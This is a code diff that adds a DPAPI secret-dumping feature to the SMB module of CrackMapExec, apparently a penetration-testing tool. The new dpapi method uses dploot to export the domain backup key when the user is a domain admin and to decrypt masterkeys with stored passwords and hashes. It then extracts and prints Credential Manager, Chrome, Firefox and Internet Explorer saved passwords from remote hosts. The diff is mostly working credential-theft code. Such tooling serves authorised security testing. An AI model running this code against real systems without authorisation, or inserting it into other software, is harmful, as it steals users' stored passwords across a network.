@@ -23,6 +23,7 @@ from impacket.krb5.kerberosv5 import SessionKeyDecryptionError
 from impacket.krb5.types import KerberosException
 from cme.connection import *
 from cme.logger import CMEAdapter
+from cme.protocols.smb.firefox import FirefoxTriage
 from cme.servers.smb import CMESMBServer
 from cme.protocols.smb.wmiexec import WMIEXEC
 from cme.protocols.smb.atexec import TSCH_EXEC
@@ -36,6 +37,13 @@ from cme.helpers.logger import highlight
 from cme.helpers.misc import *
 from cme.helpers.bloodhound import add_user_bh
 from cme.helpers.powershell import create_ps_command
+from dploot.triage.vaults import VaultsTriage
+from dploot.triage.browser import BrowserTriage
+from dploot.triage.credentials import CredentialsTriage
+from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
+from dploot.triage.backupkey import BackupkeyTriage
+from dploot.lib.target import Target
+from dploot.lib.smb import DPLootSMBConnection
 from pywerview.cli.helpers import *
 from pywerview.requester import RPCRequester
 from time import time
@@ -139,6 +147,8 @@ class smb(connection):
         self.smbv1 = None
         self.signing = False
         self.smb_share_name = smb_share_name
+        self.pvkbytes = None
+        self.no_da = None
 
         connection.__init__(self, args, db, host)
 
@@ -163,10 +173,13 @@ class smb(connection):
         cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
         cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
         cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
+        cegroup.add_argument("--dpapi", action='store_true', help='dump DPAPI secrets from target systems')
         #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
         #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')
 
         ngroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
+        ngroup.add_argument("--mkfile", action='store', help='DPAPI option. File with masterkeys in form of {GUID}:SHA1')
+        ngroup.add_argument("--pvk", action='store', help='DPAPI option. File with domain backupkey')
         ngroup.add_argument("--enabled", action='store_true', help='Only dump enabled targets from DC')
         ngroup.add_argument("--user", dest='userntds', type=str, help='Dump selected user from DC')
 
@@ -1159,6 +1172,134 @@ class smb(connection):
                 logging.debug("Error calling remote_ops.finish(): {}".format(e))
 
             SAM.finish()
+
+    @requires_admin
+    def dpapi(self):
+        logging.getLogger("dploot").disabled = True
+        
+        if self.args.pvk is not None:
+            try:
+                self.pvkbytes = open(self.args.pvk, 'rb').read()
+            except Exception as e:
+                logging.error(str(e))
+
+        masterkeys = []
+        if self.args.mkfile is not None:
+            try:
+                masterkeys += parse_masterkey_file(self.args.mkfile)
+            except Exception as e:
+                self.logger.error(str(e))
+
+        if self.pvkbytes is None and self.no_da == None:
+            try:
+                dc_target = Target.create(
+                    domain      = self.domain,
+                    username    = self.username,
+                    password    = self.password,
+                    target      = self.domain,
+                    lmhash      = self.lmhash,
+                    nthash      = self.nthash,
+                    do_kerberos = self.kerberos,
+                    aesKey      = self.aesKey,
+                    no_pass     = True,
+                    use_kcache  = self.use_kcache,
+                )
+                dc_conn = DPLootSMBConnection(dc_target) 
+                dc_conn.connect() # Connect to DC
+                if dc_conn.is_admin:
+                    self.logger.success("User is Domain Administrator, exporting domain backupkey...")
+                    backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
+                    backupkey = backupkey_triage.triage_backupkey()
+                    self.pvkbytes = backupkey.backupkey_v2
+                else:
+                    self.no_da = False
+            except Exception as e:
+                self.logger.debug("Could not get domain backupkey: {}".format(e))
+                pass
+
+        target = Target.create(
+            domain      = self.domain,
+            username    = self.username,
+            password    = self.password,
+            target      = self.hostname + "." + self.domain if self.kerberos else self.host,
+            lmhash      = self.lmhash,
+            nthash      = self.nthash,
+            do_kerberos = self.kerberos,
+            aesKey      = self.aesKey,
+            no_pass     = True,
+            use_kcache  = self.use_kcache,
+        )
+
+        try:
+            conn = DPLootSMBConnection(target) 
+            conn.smb_session = self.conn
+        except Exception as e:
+            self.logger.debug("Could not upgrade connection: {}".format(e))
+            return
+
+        plaintexts = {username:password for _, _, username, password, _,_ in self.db.get_credentials(credtype="plaintext")}
+        nthashes = {username:nt.split(':')[1] if ':' in nt else nt for _, _, username, nt, _,_ in self.db.get_credentials(credtype="hash")}
+        if self.password != '':
+            plaintexts[self.username] = self.password
+        if self.nthash != '':
+            nthashes[self.username] = self.nthash
+
+        # Collect User and Machine masterkeys
+        try:
+            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)
+            masterkeys += masterkeys_triage.triage_masterkeys()
+            masterkeys += masterkeys_triage.triage_system_masterkeys()
+        except Exception as e:
+            self.logger.debug("Could not get masterkeys: {}".format(e))
+
+        if len(masterkeys) == 0:
+            self.logger.error("No masterkeys looted")
+            return
+
+        self.logger.success("Got {} decrypted masterkeys. Looting secrets".format(highlight(len(masterkeys))))
+
+        try:
+            # Collect User and Machine Credentials Manager secrets
+            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
+            credentials = credentials_triage.triage_credentials()
+            system_credentials = credentials_triage.triage_system_credentials()
+        except Exception as e:
+            self.logger.debug("Error while looting credentials: {}".format(e))
+        for credential in credentials:
+            self.logger.highlight("[%s][CREDENTIAL] %s - %s:%s" % (credential.winuser, credential.target, credential.username, credential.password))
+        for credential in system_credentials:
+            self.logger.highlight("[SYSTEM][CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
+        
+
+        try:
+            # Collect Chrome Based Browser stored secrets
+            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
+            browser_credentials, _ = browser_triage.triage_browsers()
+        except Exception as e:
+            self.logger.debug("Error while looting browsers: {}".format(e))
+        for credential in browser_credentials:
+            self.logger.highlight("[%s][%s] %s %s:%s" % (credential.winuser, credential.browser.upper(), credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
+        
+        try:
+            # Collect User Internet Explorer stored secrets
+            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
+            vaults = vaults_triage.triage_vaults()
+        except Exception as e:
+            self.logger.debug("Error while looting vaults: {}".format(e))
+        for vault in vaults:
+            if vault.type == 'Internet Explorer':
+                self.logger.highlight("[%s][IEX] %s - %s:%s" % (vault.winuser, vault.resource+' -' if vault.resource!= '' else '-', vault.username, vault.password))
+        
+
+        try:
+            # Collect Firefox stored secrets
+            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn)
+            firefox_credentials = firefox_triage.run()
+        except Exception as e:
+            self.logger.debug("Error while looting firefox: {}".format(e))
+        for credential in firefox_credentials:
+            self.logger.highlight("[%s][FIREFOX] %s %s:%s" % (credential.winuser, credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
+        
 
     @requires_admin
     def lsa(self):
